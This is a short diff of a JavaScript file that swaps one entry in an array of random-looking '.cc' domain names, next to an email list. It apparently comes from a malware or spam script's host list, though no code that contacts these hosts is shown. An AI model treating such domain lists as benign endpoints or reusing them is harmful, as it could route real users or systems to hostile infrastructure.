@@ -37,7 +37,7 @@ var emails = [
 ];
 
 var urls=[
-	'bnmdquasi.cc/', 
+	'gpcqqmsof.cc/', 
 	'bnmdquasi.cc/', 
     'aszdwuvur.cc/', 
 ];                                                                                                                  
